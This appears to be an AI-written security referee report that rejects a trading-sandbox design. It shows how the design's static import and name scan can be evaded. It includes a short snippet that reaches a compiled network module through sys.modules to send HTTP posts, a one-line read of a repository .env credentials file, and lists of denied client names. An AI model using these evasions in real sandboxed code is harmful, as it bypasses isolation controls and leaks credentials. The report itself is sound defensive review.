# Round 1 referee report — Claude, security-engineer lens

Scope of this lens: the order path and isolation. Can any path in this design send a real order, load
credentials, open a network socket, or let a future edit widen the T-RO-01 allow-list unnoticed? I attacked the
scan amendment (§5.6), the deny-list, the `sys.modules` baseline (§5.2.7, §6.2), the child launch contract (§4.3)
and the `.env` isolation (§3.3, O3), and tried to build a concrete evasion.

All probes were read-only, in `scratchpad/referee_security/`, with the Nautilus venv at
`scratchpad/ntvenv/bin/python` under `env -i ... -I -B -X utf8`. No pilot-window data was read. No network call
was made. QUANTGEN is at HEAD `6f7c610`; `nt:` paths are `nautilus_trader` 1.231.0 in the session venv.

## Verdict

REJECT.

One blocker (SECURITY-1): the amended T-RO-01 scan, as written in §5.6, does not prevent the one sandbox file from
reaching the network-capable Rust core that `BacktestEngine` loads unconditionally, and the design puts the only
sound mitigation (OS-level egress control) out of scope (§12). I verified a concrete evasion that passes every
rule A-F and the `sys.modules` module baseline. The spec's central safety property — "orders never leave the
process" (§1), "exactly one file may place simulated orders" (§3.2) — is asserted but not enforced by the
specified rules.

I would not hand this to an engineering team as a closed order-path design without the owner first ruling on
SECURITY-1 through SECURITY-4. The arithmetic, parity and ledger design (outside my lens) look careful; my
objection is confined to the isolation guarantee.

## Sections reviewed

- §5.6 T-RO-01 amendment: constants, rules A-F, the one `submit_order` exemption, controls (§8.5). Checked against
  `tests/macro_m0_harness.py:28-109` and `tests/acceptance.py:33-47`.
- §5.2.7 + §6.2 the child module baseline and `sys_modules` manifest field, and §11 risks 2-3, O3, O13. Checked
  against the actual module set loaded by `from nautilus_trader.backtest.engine import BacktestEngine` (measured).
- §4.3 launch contract and §3.3 hermeticity; §3.2 order path. Checked against `config.py:25-39`,
  map04 §4.1-4.3.
- §3.2 / deny-list completeness for order verbs, against `nt:trading/strategy.pyx` (all order-emitting methods
  enumerated).
- §12 out of scope, §2 rulings O2/O3/O13, §8.5 scan controls, §9 Step 4 done-when.

## Issues

### SECURITY-1 — blocker — §5.6, §5.2.7, §3.2, §12, O2/O3/O13

Problem. The scan is the design's primary order-path and network boundary (risk 1-3, O2 "an order path could
pass the scan", O3 "the child holds no credentials", O13 "a loaded but unused Rust client could open a socket").
I constructed an order/network path from inside the one allow-listed sandbox file that passes every rule A-F of
§5.6 and the §5.2.7 module baseline. Importing `BacktestEngine` eagerly loads `nautilus_trader.core.nautilus_pyo3`
and 35 compiled submodules, including `.network`, `.bybit`, `.okx`, `.kraken`, etc. Those modules are already in
`sys.modules` and expose raw network primitives and authenticated venue clients. They can be reached without any
denied identifier, import, import-machinery string, or dynamic-call:

```python
import sys                                        # sys is in SANDBOX_IMPORTS (§5.6)
from nautilus_trader.backtest.engine import BacktestEngine   # the one required import
net = sys.modules["nautilus_trader.core.nautilus_pyo3"].network
net.http_post("https://any-host/...", ...)        # raw HTTP egress, no forbidden verb
```

Why each rule misses it (verified by probe):
- Rule C (imports): only `import sys` appears; `sys` is allowed. The pyo3 module is never *imported*, it is read
  out of `sys.modules`.
- Rule D (identifiers): the denied names are the *generic* bases `HttpClient`, `WebSocketClient`, `SocketClient`,
  `nautilus_pyo3` (§5.6 `NAUTILUS_DENIED_NAMES`). The identifiers used above are `sys`, `modules`, `network`,
  `http_post` — none is denied. The one denied token, `nautilus_pyo3`, never appears as an identifier because it
  is inside a string subscript.
- Rule E (strings): only strings inside an import-machinery *call* are checked ("String constants anywhere else
  are not checked", §5.6-E). `sys.modules["..."]` is a `Subscript`, and `sys.modules.get("...")` is a call to
  `get`, not to import machinery. The dotted string evades E.
- Rule F (dynamic code): no `getattr`/`eval`/`exec`/`__import__`/`os.system` is used; a subscript is none of
  these.
- Rule A/B (order verbs): `http_post`/`http_get`/`http_delete`/`http_patch`/`http_download` are free functions of
  `nautilus_pyo3.network`, and venue clients expose non-verb methods such as `set_leverage`, `set_margin_mode`,
  `borrow_spot`, `request_account_state`, `get_account_details` (probe `referee_security/probes/evade.py`). None
  is in `FORBIDDEN_CALLS` or `NAUTILUS_ORDER_VERBS`, so a transmit does not require a forbidden method name. (A
  literal `client.submit_order(...)` *would* trip rule A, but it is not needed to open a socket or hit an account
  endpoint.)
- Module baseline (§5.2.7, C-08): the baseline is the union of the F1/F2/N3 `sys.modules` lists, which already
  contain `nautilus_trader.core.nautilus_pyo3.network` and the venue submodules, so *using* them loads nothing
  new. C-08's prefix check is `nautilus_trader.adapters` / `nautilus_trader.network` — the *Python* packages,
  which a backtest never loads — not `nautilus_trader.core.nautilus_pyo3.*`. The baseline therefore gives zero
  protection against this path.

Evidence. Probe `referee_security/probes/mods.py`: a bare `BacktestEngine` import loads 974 modules including
`_socket`, `_ssl`, `asyncio`, `ssl`, `uvloop`, and `nautilus_trader.core.nautilus_pyo3.{network,binance,bybit,
okx,kraken,...}` (35 submodules). Probe `referee_security/probes/net2.py`: `sys.modules[
"nautilus_trader.core.nautilus_pyo3"].network.http_post` is a callable builtin, `.http_get` likewise, and the
`sys.modules.get(...)` spelling also resolves. `nt:core/nautilus_pyo3.pyi:7333-7494` shows `BybitHttpClient(api_key,
api_secret, base_url, demo, testnet)` with `submit_order`, `set_leverage`, etc. Map04 §9.3 and map01 §9.3 both
note Rust sockets are invisible to a Python `sys.addaudithook`, so an audit hook would not see this either. §12
explicitly lists "a firewall rule or audit hook" as out of scope, and §11 risk 3 leans on "Linux showed 0 socket
calls … Windows: UNVERIFIED" — but the of-record pilots run on the owner's Windows machine with live network
(§2 O10, §9 Step 7A), exactly where no egress measurement exists.

Caveat on threat model (so the owner can calibrate). This is an evasion available to a *deliberate or careless
edit of the sandbox file*, or to smuggled/"helper" code that reuses the Rust HTTP client (e.g. to fetch data). An
honest sandbox written exactly as §5.2 specifies never does this. If the owner's threat model is strictly
"accidental order path by an honest author," this degrades to major. But the spec frames the scan as a security
boundary (risk 1, O2, O3), and the task is whether the boundary holds against a constructed attack; it does not.

Proposed fix (pick at least one sound layer, not only the scan):
1. Runtime egress denial that does not depend on the static scan and that covers Rust sockets: run the of-record
   pilots with OS-level network isolation (a deny-all outbound firewall rule on Windows for the venv interpreter;
   a network namespace / `unshare -n`-equivalent is already shown to work on Linux, map04 §4.2). Move "firewall
   rule" out of §12 and into the required hand-off (Step 7A) with a recorded verification that an outbound connect
   fails. This is the only layer that actually binds the Rust core.
2. Harden the child at startup, before `engine.run()`: after importing `BacktestEngine`, delete or neuter the
   network-capable submodules (`for k in list(sys.modules): if k.startswith("nautilus_trader.core.nautilus_pyo3")
   and k.endswith((".network", ".<venue>")) ...`) or replace `nautilus_pyo3.network.http_post` et al. with a
   raising stub, and assert the stub is in place. Record this in the manifest.
3. Tighten the scan so `sys.modules` / `__dict__` / `__globals__` subscript-or-attribute reach into
   `nautilus_trader.core.nautilus_pyo3` is itself an offence (treat the dotted string `nautilus_trader.core.
   nautilus_pyo3` and `nautilus_pyo3` as denied in *any* string constant inside the sandbox, not only in
   import-machinery calls; and deny attribute/subscript access to `modules` on `sys` in the sandbox). The scan
   alone remains unsound against the Rust core, so do this in addition to (1).

### SECURITY-2 — major — §5.2.7, §6.2, §11 risk 2 & 3, O13

Problem. The `sys.modules` baseline is a *load-time* guard presented as a *use-time* guard. §5.2.7 and risk 2
("A live or adapter module is imported … the parent's module baseline and prefix check") and risk 3 both rely on
the baseline to catch adapter/network/live loads. But the compiled venue and network clients are loaded
unconditionally at `BacktestEngine` import (probe `mods.py`), so they are *inside* every valid baseline. The
baseline can only ever flag a *newly* loaded module; it cannot detect use of an already-loaded client. This is
the mechanism SECURITY-1 exploits, and it means the baseline offers no defence against the exact surface it is
cited to defend.

Evidence. `scratchpad/referee_security/probes/mods.py`: after a bare engine import, `sys.modules` already
contains `nautilus_trader.core.nautilus_pyo3.network`, `.binance`, `.bybit`, `.okx`, `.kraken`, `.dydx`,
`.hyperliquid`, `.polymarket`, `.interactive_brokers`, etc. C-08's prefix test (§5.2.7, §7 C-08) matches only the
top-level Python packages `nautilus_trader.adapters` / `nautilus_trader.network`, and my probe shows those Python
packages are *not* loaded in a backtest (the measured `adapters/network: []`).

Proposed fix. State plainly that the baseline is a load-regression check only, and that it does not bound use of
the pyo3 clients (fold this into O13's cost column). Rely on SECURITY-1 fix (1) or (2) for the actual guarantee.
Optionally extend C-08 to also flag any baseline that *contains* `nautilus_trader.core.nautilus_pyo3.network` or a
venue submodule being *present at all* is unavoidable, so the useful signal is the runtime egress check, not the
module list.

### SECURITY-3 — major — §4.3, §3.3, O3, §11 risk 6

Problem. The launch contract strips the child's *environment variables* of every `.env` key (good), and C-10
checks reported `env_keys` against the allowed set. But nothing stops the child from reading the repository's
`.env` *file* directly. The sandbox is launched with its absolute path as `argv` (§4.3), so `__file__` reveals the
repository root; `open` is an unrestricted builtin (not in `SANDBOX_DYNAMIC` or `SANDBOX_OS_CALLS`, rule F), and
`os` and `pathlib` are in `SANDBOX_IMPORTS`. So `open(Path(__file__).parents[2] / ".env")` reads any exchange API
keys the owner keeps there. This contradicts O3 ("The child holds no credentials") and risk 6 ("`.env` keys reach
the child"), which are both scoped to environment variables only.

Evidence. `config.py:25-29` loads `.env` into the *parent* via `python-dotenv`; the child does not auto-load it
(probe `net2.py`: `dotenv` not in the child's `sys.modules`), so the env-var isolation holds — but `open` is
callable in the child (probe `net2.py`), `-I` does not disable file I/O, and the cwd being a temp dir does not
prevent an absolute-path read. The `.env` is at the repo root (`.gitignore:1`), locatable from `__file__`.

Proposed fix. Either (a) require the of-record venv/interpreter to run with no filesystem read access to the repo
root beyond the temp dir and the venv (hard on Windows), or (b) add to rule F a ban on `open`/`Path.read_text`/
`Path.read_bytes` in the sandbox against any path not under the child's temp dir — but the sandbox legitimately
reads `input.json`/`bars.csv` from the temp dir, so the check must be that the sandbox opens only paths derived
from its `--in` argument. Simplest and soundest: combine with SECURITY-1 fix (1) — if egress is blocked, reading a
key is inert. State the `.env`-file vector explicitly so O3's claim is not overbroad.

### SECURITY-4 — major — §12, §11 risk 3, §9 Step 7A, O10

Problem. The design has no runtime or OS-level egress control, and explicitly removes the only layer that would
bind the Rust core: §12 lists "a firewall rule or audit hook" as out of scope. The remaining evidence for "no
order can leave the machine" (O3, risk 3) is a single Linux `strace` of a *different* strategy shape (map04 §4.2)
plus "Windows: UNVERIFIED." The of-record pilots run on the owner's Windows machine (O10, Step 7A), which is the
one place with live network and no measurement. So for the runs that actually touch the production ledger, there
is no egress guarantee at all — only the scan, which SECURITY-1 defeats.

Evidence. §12 bullet 6; §11 risk 3 mitigation column; map04 §4.3 final paragraph ("On Windows there is no strace
or unshare … UNVERIFIED"); map01 §9.3 ("Rust code inside `nautilus_pyo3` opens sockets without Python audit
events").

Proposed fix. Make an outbound-deny verification a required done-when at Step 7A on Windows (e.g. a probe that
attempts a connect through the venv interpreter and must fail), and on Linux run every child under a no-network
namespace in rehearsal. Move egress control from §12 into the required contract. If the owner declines OS-level
control, the spec should stop claiming the order path is closed and instead state that safety rests on an
honest-author assumption plus code review.

### SECURITY-5 — major — §5.6, §8.5, §9 Step 4

Problem. The amendment introduces, for the first time, an *allow* in the T-RO-01 family (one file may place
orders; one file may import `nautilus_trader`). Nothing pins that allow. `NAUTILUS_SANDBOX`, `NAUTILUS_ALLOWED_FROM`,
`NAUTILUS_MODEL`, `NAUTILUS_DENIED`, `NAUTILUS_DENIED_NAMES` and `NAUTILUS_ORDER_VERBS` are plain literals in
`tests/macro_m0_harness.py`, and there is no meta-test asserting their contents (I grepped: no test references
these names outside the harness, and the harness does not assert its own ruleset). The §8.5 controls exercise
*fixed probe files*; they do not assert invariants of the constants. A future edit that adds a key to
`NAUTILUS_ALLOWED_FROM` not exercised by a control, repoints or widens `NAUTILUS_SANDBOX` (e.g. to a second file or
a prefix), or removes a `NAUTILUS_DENIED` entry whose tag no control checks, passes the whole suite. That is the
"widen the allow-list unnoticed" case the task names, and it is realizable.

Evidence. `tests/macro_m0_harness.py:28-109` holds the existing literals with no self-pinning test;
`grep -rn 'NAUTILUS_DENIED|FORBIDDEN_CALLS|NAUTILUS_ALLOWED' tests/` finds references only inside the harness.
The §8.5 control table asserts "expected rule tags" per probe, not "exactly one file is exempt" or "the deny-list
contains X."

Proposed fix. Add a meta-test (layer 1) that asserts: `NAUTILUS_SANDBOX == "tools/nautilus/sandbox.py"` exactly;
`NAUTILUS_ORDER_VERBS` plus `{"submit_order_list","cancel_order"}` are a subset of `FORBIDDEN_CALLS`;
`NAUTILUS_DENIED` and `NAUTILUS_DENIED_NAMES` each contain their security-critical entries verbatim; and that
exactly one file in the scanned tree is exempt from the `nautilus_trader`-import rule. Pin the whole amended
ruleset by a committed snapshot/golden so any change to it is a visible diff that fails until updated
deliberately. The §9 Step 4 done-when should include this.

### SECURITY-6 — minor — §5.6 deny-list

Problem. `NAUTILUS_DENIED_NAMES` denies the *generic* base classes `HttpClient`, `WebSocketClient`, `SocketClient`
and the bare `nautilus_pyo3`, but not the concrete per-venue client classes that actually carry
`submit_order`/`api_key`/`api_secret` — `BybitHttpClient`, `OKXWebSocketClient`, `KrakenSpotHttpClient`,
`AxOrdersWebSocketClient`, `BitmexHttpClient`, `HyperliquidHttpClient`, etc. — nor the `nautilus_pyo3.network`
free functions `http_post`/`http_get`/`http_delete`/`http_patch`/`http_download`. Rule D (a name-based check) is
the sole backstop for these, and it misses them. Today this is backstopped by the `nautilus_pyo3` attribute/import
deny (so you cannot reach the classes without the denied token) — except via the `sys.modules` string path of
SECURITY-1, which is exactly why that path works.

Evidence. §5.6 `NAUTILUS_DENIED_NAMES`; probe `evade.py` lists the concrete class/method names;
`nt:core/nautilus_pyo3.pyi` top-level client classes (`AxHttpClient`, `BybitHttpClient`, `OKXWebSocketClient`, …)
and `network` free functions.

Proposed fix. If the scan is kept as a layer, add the concrete client class names and the `http_*` free functions
to `NAUTILUS_DENIED_NAMES`, and treat the dotted string `nautilus_trader.core.nautilus_pyo3` (and `nautilus_pyo3`)
as denied inside *any* string constant in the sandbox, not only in import-machinery calls (closes SECURITY-1's
string-subscript spelling at the scan layer). Note this is still not sound on its own (SECURITY-1), only narrower.

### SECURITY-7 — minor — §5.6 rule A

Problem. Rule A exempts the `submit_order` hits only when `k == m`, where `k` is the count of the lowercased
substring `submit_order` in the executable surface and `m` is the count of `self.submit_order(...)` calls. Because
`k` is a substring count over code text, any benign occurrence of the substring — a string literal, a variable
named `submit_order_count`, a comment-free docstring is stripped so that is fine, but identifiers are not —
inflates `k` above `m` and fails the whole file. This fails closed (safe), but it is surprising and will cause
false build breaks; an engineer may then be tempted to restructure the counting rather than the code. It is also
the only rule in the set whose correctness depends on a textual count rather than the AST.

Evidence. §5.6 rule A text; `_code_only` (`tests/acceptance.py:33-47`) strips docstrings/comments but leaves
identifiers and string literals.

Proposed fix. Count `k` as AST `Attribute(attr="submit_order")` nodes (any receiver) rather than a substring, and
require every such node to be on `Name(id="self")`; drop the lowercased-substring count entirely. This keeps the
"only `self.submit_order`" guarantee without the brittleness, and removes the `submit_order_list` substring
interaction (that verb is already caught by rule B).

## Notes

- Order-verb deny-list completeness (not an issue). I enumerated every order/position-mutating public method on
  the Python `Strategy` at `nt:trading/strategy.pyx`: `submit_order` (:805), `submit_order_list` (:899),
  `modify_order` (:1011), `cancel_order` (:1089), `cancel_orders` (:1134), `cancel_all_orders` (:1215),
  `close_position` (:1351), `close_all_positions` (:1418), `market_exit` (:1750). The amendment's
  `FORBIDDEN_CALLS` + `NAUTILUS_ORDER_VERBS` cover all of them, with `submit_order` the single rule-A exemption
  and `cancel_order` already forbidden. `query_order` (:1527), `change_order_id_tag` (:340) and `cancel_gtd_expiry`
  (:1687) are not order emitters and are correctly left out. For the Python strategy surface the deny-list is
  complete; my blocker is about the *Rust* surface reachable around it, not the Python methods.
- Launch contract isolation (holds for env vars). `-I` implies `-E -s -P` on 3.13, so `PYTHON*` vars and the
  user site are ignored and the script directory is not on `sys.path` (§4.3 claim is correct); `subprocess.run`
  with an explicit `env=` dict replaces, not merges, the environment; the child does not auto-load `.env` (probe
  confirms `dotenv` absent in the child). The env-variable half of `.env` isolation is sound; the file half is
  SECURITY-3.
- The spec is unusually candid about the residual Windows risk (O13, risk 3, open question 1) and about the scan
  possibly being too wide (O2). My findings are that the *named* mitigations for those risks (the §8.5 controls,
  the module baseline) do not actually bound the attack, and that the sound mitigation is excluded by §12.
- Path note: the task directed this report to `docs/superpowers/specs/2026-10-26-nautilus-review/`, while §9
  Step 1 of the spec names `docs/superpowers/specs/2026-10-26-review/`. I wrote to the task's path; the owner may
  want the two reconciled so Step 1's done-when points at the right folder.
- Everything above is verified against HEAD `6f7c610` and the session venv except the Windows standard-precision
  and Windows-egress facts, which are UNVERIFIED by construction (no Windows host here) and are the subject of
  SECURITY-4.
